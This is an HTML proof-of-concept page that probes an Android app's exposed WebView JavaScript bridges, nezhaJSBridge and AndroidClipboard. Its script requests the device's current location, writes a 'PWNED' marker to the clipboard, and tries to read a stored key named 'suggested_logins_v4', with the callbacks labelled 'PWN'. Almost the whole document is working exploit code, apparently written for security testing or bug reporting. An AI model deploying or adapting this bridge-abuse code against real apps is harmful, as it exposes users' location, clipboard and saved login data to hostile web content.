<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>BRIDGE-TEST</title></head>
<body style="background:#000;color:#0f0;font:20px/1.6 monospace;padding:16px;word-break:break-all">
<div id=o>BRIDGE TEST...</div>
<script>
var el = document.getElementById('o');
function log(s){ el.textContent += '\n' + s; }
log('PAGE=' + location.href.slice(0,60));
// 1) nezhaJSBridge 探测
log('nezhaJSBridge=' + (typeof window.nezhaJSBridge));
if (window.nezhaJSBridge) {
  try {
    window.nezhaJSBridge.postMessage(JSON.stringify({
      module:'device', action:'current_location',
      params:{}, callback_dispatcher:'PWN', callback_id:'pwn1'
    }));
    log('POSTED device.current_location');
  } catch(e) { log('postMessage ERR ' + e.message); }
}
// 2) AndroidClipboard 探测
log('AndroidClipboard=' + (typeof window.AndroidClipboard));
if (window.AndroidClipboard) {
  try {
    window.AndroidClipboard.copyToClipboard('PWNED-CLIPBOARD-2026-08-22','PWNED-CLIPBOARD-2026-08-22');
    log('CLIPBOARD WRITE SENT');
  } catch(e) { log('clipboard ERR ' + e.message); }
}
// 3) local_storage 读取尝试
if (window.nezhaJSBridge) {
  try {
    window.nezhaJSBridge.postMessage(JSON.stringify({
      module:'local_storage', action:'get',
      params:{key:'suggested_logins_v4'}, callback_dispatcher:'PWN', callback_id:'pwn2'
    }));
    log('POSTED local_storage.get');
  } catch(e) { log('ls ERR ' + e.message); }
}
log('DONE');
</script></body></html>
